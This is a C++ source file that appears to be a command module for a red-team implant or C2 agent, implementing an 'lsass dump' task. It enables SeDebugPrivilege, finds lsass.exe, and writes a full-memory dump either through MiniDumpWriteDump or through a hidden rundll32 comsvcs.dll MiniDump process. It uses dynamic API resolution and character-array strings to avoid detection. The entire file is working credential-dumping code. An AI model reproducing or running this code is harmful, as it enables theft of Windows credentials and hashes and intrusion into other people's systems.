#include <common.h>
#include <commands.h>
#include <package.h>
#include <parser.h>
#include <config.h>
#include <strings.h>

#ifdef INCLUDE_CMD_LSASS_DUMP

using namespace stardust;
using namespace starburst;

// dynamically resolved function typedefs
typedef DWORD   (WINAPI *fn_GetTempPathA)( DWORD, LPSTR );
typedef HANDLE  (WINAPI *fn_CreateToolhelp32Snapshot)( DWORD, DWORD );
typedef BOOL    (WINAPI *fn_Process32First)( HANDLE, LPVOID );
typedef BOOL    (WINAPI *fn_Process32Next)( HANDLE, LPVOID );
typedef BOOL    (WINAPI *fn_MiniDumpWriteDump)(
    HANDLE, DWORD, HANDLE, DWORD, PVOID, PVOID, PVOID );

// local PROCESSENTRY32 definition for PIC context
#pragma pack(push, 1)
struct PE32 {
    DWORD dwSize;
    DWORD cntUsage;
    DWORD th32ProcessID;
    ULONG_PTR th32DefaultHeapID;
    DWORD th32ModuleID;
    DWORD cntThreads;
    DWORD th32ParentProcessID;
    LONG  pcPriClassBase;
    DWORD dwFlags;
    char  szExeFile[260];
};
#pragma pack(pop)

// case-insensitive comparison for ASCII process names
static auto declfn str_icmp( const char* a, const char* b ) -> int {
    while ( *a && *b ) {
        char ca = *a;
        char cb = *b;
        if ( ca >= 'A' && ca <= 'Z' ) ca += 32;
        if ( cb >= 'A' && cb <= 'Z' ) cb += 32;
        if ( ca != cb ) return ca - cb;
        a++;
        b++;
    }
    char ca = *a;
    char cb = *b;
    if ( ca >= 'A' && ca <= 'Z' ) ca += 32;
    if ( cb >= 'A' && cb <= 'Z' ) cb += 32;
    return ca - cb;
}

// enable a named privilege on the current process token
static auto declfn enable_priv(
    instance& inst,
    const wchar_t* priv_name
) -> bool {
    HANDLE h_token = nullptr;
    if ( !inst.advapi32.OpenProcessToken(
            reinterpret_cast<HANDLE>( static_cast<LONG_PTR>( -1 ) ),
            TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &h_token ) )
        return false;

    TOKEN_PRIVILEGES tp = {};
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    inst.advapi32.LookupPrivilegeValueW( nullptr, priv_name, &tp.Privileges[0].Luid );
    inst.advapi32.AdjustTokenPrivileges( h_token, FALSE, &tp, sizeof(tp), nullptr, nullptr );

    DWORD err = inst.kernel32.GetLastError();
    inst.kernel32.CloseHandle( h_token );
    return ( err == 0 );
}

// find lsass.exe PID using CreateToolhelp32Snapshot
static auto declfn find_lsass_pid( instance& inst ) -> DWORD {
    auto pCreateToolhelp32Snapshot = reinterpret_cast<fn_CreateToolhelp32Snapshot>(
        inst.kernel32.GetProcAddress(
            (HMODULE)inst.kernel32.handle,
            symbol<LPCSTR>( "CreateToolhelp32Snapshot" ) ) );
    auto pProcess32First = reinterpret_cast<fn_Process32First>(
        inst.kernel32.GetProcAddress(
            (HMODULE)inst.kernel32.handle,
            symbol<LPCSTR>( "Process32First" ) ) );
    auto pProcess32Next = reinterpret_cast<fn_Process32Next>(
        inst.kernel32.GetProcAddress(
            (HMODULE)inst.kernel32.handle,
            symbol<LPCSTR>( "Process32Next" ) ) );

    if ( !pCreateToolhelp32Snapshot || !pProcess32First || !pProcess32Next )
        return 0;

    // TH32CS_SNAPPROCESS = 0x00000002
    HANDLE h_snap = pCreateToolhelp32Snapshot( 0x00000002, 0 );
    if ( h_snap == INVALID_HANDLE_VALUE )
        return 0;

    PE32 pe = {};
    pe.dwSize = sizeof(PE32);

    DWORD lsass_pid = 0;
    char target[] = { 'l','s','a','s','s','.','e','x','e', 0 };

    if ( pProcess32First( h_snap, &pe ) ) {
        do {
            if ( str_icmp( pe.szExeFile, target ) == 0 ) {
                lsass_pid = pe.th32ProcessID;
                break;
            }
            pe.dwSize = sizeof(PE32);
        } while ( pProcess32Next( h_snap, &pe ) );
    }

    inst.kernel32.CloseHandle( h_snap );
    return lsass_pid;
}

// method: minidump — uses MiniDumpWriteDump from dbghelp.dll
static auto declfn do_minidump(
    instance& inst,
    char* task_uuid,
    char* dump_path,
    DWORD lsass_pid
) -> void {
    // open lsass process
    HANDLE h_lsass = inst.kernel32.OpenProcess(
        PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, lsass_pid );
    if ( !h_lsass ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "OpenProcess lsass failed" ) ) );
        return;
    }

    // load dbghelp.dll
    HMODULE h_dbghelp = reinterpret_cast<HMODULE>( inst.kernel32.LoadLibraryA(
        symbol<LPCSTR>( "dbghelp.dll" ) ) );
    if ( !h_dbghelp ) {
        inst.kernel32.CloseHandle( h_lsass );
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "LoadLibrary dbghelp failed" ) ) );
        return;
    }

    auto pMiniDumpWriteDump = reinterpret_cast<fn_MiniDumpWriteDump>(
        inst.kernel32.GetProcAddress( h_dbghelp,
            symbol<LPCSTR>( "MiniDumpWriteDump" ) ) );
    if ( !pMiniDumpWriteDump ) {
        inst.kernel32.CloseHandle( h_lsass );
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "MiniDumpWriteDump not found" ) ) );
        return;
    }

    // create output file
    HANDLE h_file = inst.kernel32.CreateFileA(
        dump_path,
        GENERIC_WRITE,
        0,
        nullptr,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        nullptr );
    if ( h_file == INVALID_HANDLE_VALUE ) {
        inst.kernel32.CloseHandle( h_lsass );
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "CreateFileA dump path failed" ) ) );
        return;
    }

    // MiniDumpWithFullMemory = 0x00000002
    BOOL ok = pMiniDumpWriteDump(
        h_lsass, lsass_pid, h_file,
        0x00000002,
        nullptr, nullptr, nullptr );

    inst.kernel32.CloseHandle( h_file );
    inst.kernel32.CloseHandle( h_lsass );

    if ( !ok ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "MiniDumpWriteDump failed" ) ) );
        return;
    }

    // success
    char msg[512] = { 0 };
    str_copy( msg, symbol<char*>( const_cast<char*>( "LSASS dumped to " ) ) );
    str_concat( msg, dump_path );
    str_concat( msg, symbol<char*>( const_cast<char*>( " (minidump)" ) ) );
    queue_response( inst, task_uuid, RESPONSE_SUCCESS, msg );
}

// method: comsvcs — uses rundll32 comsvcs.dll MiniDump
static auto declfn do_comsvcs(
    instance& inst,
    char* task_uuid,
    char* dump_path,
    DWORD lsass_pid
) -> void {
    // build command: rundll32.exe C:\windows\system32\comsvcs.dll, MiniDump <pid> <path> full
    char cmdline[512] = { 0 };
    str_copy( cmdline, symbol<char*>( const_cast<char*>(
        "rundll32.exe C:\\windows\\system32\\comsvcs.dll, MiniDump " ) ) );

    char pid_str[12] = { 0 };
    int_to_str( pid_str, lsass_pid, 10 );
    str_concat( cmdline, pid_str );
    str_concat( cmdline, symbol<char*>( const_cast<char*>( " " ) ) );
    str_concat( cmdline, dump_path );
    str_concat( cmdline, symbol<char*>( const_cast<char*>( " full" ) ) );

    wchar_t wcmdline[512] = { 0 };
    inst.kernel32.MultiByteToWideChar( CP_ACP, 0, cmdline, -1, wcmdline, 512 );

    STARTUPINFOW si = {};
    si.cb          = sizeof( STARTUPINFOW );
    si.dwFlags     = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    PROCESS_INFORMATION pi = {};

    BOOL ok = inst.kernel32.CreateProcessW(
        nullptr, wcmdline,
        nullptr, nullptr,
        FALSE,
        CREATE_NO_WINDOW,
        nullptr, nullptr,
        &si, &pi );

    if ( !ok ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "CreateProcessW comsvcs failed" ) ) );
        return;
    }

    inst.kernel32.WaitForSingleObject( pi.hProcess, 30000 );

    DWORD exit_code = 1;
    typedef BOOL (WINAPI *fn_GetExitCodeProcess)( HANDLE, LPDWORD );
    auto pGetExitCodeProcess = reinterpret_cast<fn_GetExitCodeProcess>(
        inst.kernel32.GetProcAddress(
            (HMODULE)inst.kernel32.handle,
            symbol<LPCSTR>( "GetExitCodeProcess" ) ) );
    if ( pGetExitCodeProcess )
        pGetExitCodeProcess( pi.hProcess, &exit_code );

    inst.kernel32.CloseHandle( pi.hThread );
    inst.kernel32.CloseHandle( pi.hProcess );

    if ( exit_code != 0 ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "comsvcs MiniDump failed" ) ) );
        return;
    }

    char msg[512] = { 0 };
    str_copy( msg, symbol<char*>( const_cast<char*>( "LSASS dumped to " ) ) );
    str_concat( msg, dump_path );
    str_concat( msg, symbol<char*>( const_cast<char*>( " (comsvcs)" ) ) );
    queue_response( inst, task_uuid, RESPONSE_SUCCESS, msg );
}

auto declfn starburst::cmd_lsass_dump(
    _Inout_ instance& inst,
    _In_    char*     task_uuid,
    _In_    Parser*   params
) -> void {
    // parse arguments: method (string), dump_path (string)
    uint32_t method_len = 0;
    auto method_str = parser_string( params, &method_len );

    uint32_t path_len = 0;
    auto path_str = parser_string( params, &path_len );

    if ( !method_str || method_len == 0 ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "need method: minidump or comsvcs" ) ) );
        return;
    }

    // copy method to stack buffer
    char method[32] = { 0 };
    memory::copy( method, method_str, method_len < 31 ? method_len : 31 );

    // build dump path — use provided or default to temp dir
    char dump_path[280] = { 0 };
    if ( path_str && path_len > 0 ) {
        memory::copy( dump_path, path_str, path_len < 270 ? path_len : 270 );
    } else {
        // resolve GetTempPathA for default path
        auto pGetTempPathA = reinterpret_cast<fn_GetTempPathA>(
            inst.kernel32.GetProcAddress(
                (HMODULE)inst.kernel32.handle,
                symbol<LPCSTR>( "GetTempPathA" ) ) );
        if ( pGetTempPathA ) {
            DWORD tlen = pGetTempPathA( 260, dump_path );
            if ( tlen == 0 || tlen > 240 ) {
                str_copy( dump_path, symbol<char*>( const_cast<char*>( "C:\\Windows\\Temp\\" ) ) );
            }
        } else {
            str_copy( dump_path, symbol<char*>( const_cast<char*>( "C:\\Windows\\Temp\\" ) ) );
        }
        str_concat( dump_path, symbol<char*>( const_cast<char*>( "d.dmp" ) ) );
    }

    // enable SeDebugPrivilege for cross-process access
    WCHAR debug_priv[] = { 'S','e','D','e','b','u','g','P','r','i','v','i','l','e','g','e', 0 };
    enable_priv( inst, debug_priv );

    // find lsass.exe PID
    DWORD lsass_pid = find_lsass_pid( inst );
    if ( lsass_pid == 0 ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "lsass.exe not found" ) ) );
        return;
    }

    // dispatch based on method
    char minidump_str[] = { 'm','i','n','i','d','u','m','p', 0 };
    char comsvcs_str[]  = { 'c','o','m','s','v','c','s', 0 };

    if ( str_icmp( method, minidump_str ) == 0 ) {
        do_minidump( inst, task_uuid, dump_path, lsass_pid );
    } else if ( str_icmp( method, comsvcs_str ) == 0 ) {
        do_comsvcs( inst, task_uuid, dump_path, lsass_pid );
    } else {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "unknown method: use minidump or comsvcs" ) ) );
    }
}

#endif
